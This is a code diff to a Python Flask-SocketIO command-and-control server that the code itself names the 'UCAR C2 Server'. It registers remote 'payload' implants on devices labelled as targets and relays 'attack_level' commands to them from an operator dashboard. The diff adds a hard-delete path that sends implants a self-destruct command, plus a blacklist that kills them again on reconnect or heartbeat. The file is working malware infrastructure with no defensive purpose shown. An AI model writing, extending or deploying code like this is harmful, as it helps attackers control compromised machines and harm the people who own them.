@@ -2,7 +2,6 @@
 # Author: Sigma
 
 # --- CRITICAL FIX: Monkey Patching ---
-# This must be the very first line of code, before importing Flask.
 import eventlet
 eventlet.monkey_patch()
 
@@ -10,32 +9,26 @@ from flask import Flask
 from flask_socketio import SocketIO, emit, join_room
 import time
 
-# Initialize Flask
 app = Flask(__name__)
 app.config['SECRET_KEY'] = 'secret!'
-
-# Initialize SocketIO with CORS allowed for all origins
 socketio = SocketIO(app, async_mode='eventlet', cors_allowed_origins="*")
 
 # --- Data Store ---
-# { 'session_id': { 'nametag': '...', 'status': 'online', 'last_seen': 0, 'attack_level': 0, 'deleted': False } }
 sessions = {}
+# Blacklist to prevent deleted payloads from reappearing
+blacklist = set()
 
-# --- Health Check Route (Fixes Render 404 Error) ---
 @app.route('/')
 def health_check():
     return "UCAR C2 Server is Operational", 200
 
-# --- Background Task: Offline Checker ---
 def check_offline_sessions():
-    """Checks for offline sessions."""
     while True:
-        socketio.sleep(10) # Use socketio.sleep for eventlet compatibility
+        socketio.sleep(10)
         now = time.time()
         changed = False
         for sid, data in sessions.items():
-            # Only mark offline if not already in trash
-            if not data['deleted'] and data['status'] == 'online' and now - data['last_seen'] > 30:
+            if data['status'] == 'online' and now - data['last_seen'] > 30:
                 sessions[sid]['status'] = 'offline'
                 changed = True
         if changed:
@@ -55,35 +48,23 @@ def handle_attack(data):
     level = data.get('level')
     if sid in sessions:
         sessions[sid]['attack_level'] = level
-        # Relay command to payload
         socketio.emit('command_update_attack', {'level': level}, namespace='/payload', room=sid)
-        # Update dashboards
         emit('session_list_update', sessions, broadcast=True, namespace='/dashboard')
 
-@socketio.on('move_to_trash', namespace='/dashboard')
-def move_to_trash(data):
-    """Soft delete: Moves session to trash bin."""
+@socketio.on('delete_session', namespace='/dashboard')
+def delete_session(data):
+    """Hard delete: Triggers self-destruct and blacklists the ID."""
     sid = data.get('session_id')
+    
+    # 1. Add to blacklist immediately
+    blacklist.add(sid)
+    
+    # 2. Send Self-Destruct Command
+    print(f"Issuing KILL command to {sid}")
+    socketio.emit('command_self_destruct', {}, namespace='/payload', room=sid)
+    
+    # 3. Remove from active sessions
     if sid in sessions:
-        sessions[sid]['deleted'] = True
-        sessions[sid]['attack_level'] = 0
-        socketio.emit('command_update_attack', {'level': 0}, namespace='/payload', room=sid)
-        emit('session_list_update', sessions, broadcast=True, namespace='/dashboard')
-
-@socketio.on('restore_session', namespace='/dashboard')
-def restore_session(data):
-    """Restores session from trash bin."""
-    sid = data.get('session_id')
-    if sid in sessions:
-        sessions[sid]['deleted'] = False
-        emit('session_list_update', sessions, broadcast=True, namespace='/dashboard')
-
-@socketio.on('permanent_delete', namespace='/dashboard')
-def permanent_delete(data):
-    """Hard delete: Triggers self-destruct and removes from server."""
-    sid = data.get('session_id')
-    if sid in sessions:
-        socketio.emit('command_self_destruct', {}, namespace='/payload', room=sid)
         del sessions[sid]
         emit('session_list_update', sessions, broadcast=True, namespace='/dashboard')
 
@@ -100,6 +81,14 @@ def update_nametag(data):
 def payload_register(data):
     sid = data.get('session_id')
     if not sid: return
+    
+    # Check Blacklist
+    if sid in blacklist:
+        # If a blacklisted payload tries to connect, kill it again.
+        join_room(sid)
+        emit('command_self_destruct', {}, namespace='/payload', room=sid)
+        return
+
     join_room(sid)
     
     if sid not in sessions:
@@ -107,8 +96,7 @@ def payload_register(data):
             'nametag': f'Target-{sid[:4]}', 
             'status': 'online', 
             'last_seen': time.time(), 
-            'attack_level': 0,
-            'deleted': False
+            'attack_level': 0
         }
     else:
         sessions[sid]['status'] = 'online'
@@ -116,16 +104,18 @@ def payload_register(data):
         
     socketio.emit('session_list_update', sessions, namespace='/dashboard')
     
-    # Sync state
-    emit('command_update_attack', {'level': sessions[sid]['attack_level']}, namespace='/payload', room=sid)
-    if sessions[sid]['deleted']:
-        emit('command_update_attack', {'level': 0}, namespace='/payload', room=sid)
+    # Sync attack state (in case of reconnect)
+    current_level = sessions[sid]['attack_level']
+    emit('command_update_attack', {'level': current_level}, namespace='/payload', room=sid)
 
 @socketio.on('payload_heartbeat', namespace='/payload')
 def heartbeat(data):
     sid = data.get('session_id')
     if sid in sessions:
         sessions[sid]['last_seen'] = time.time()
+    elif sid in blacklist:
+        # Kill heartbeat from blacklisted device
+        emit('command_self_destruct', {}, namespace='/payload', room=sid)
 
 if __name__ == '__main__':
     socketio.run(app)
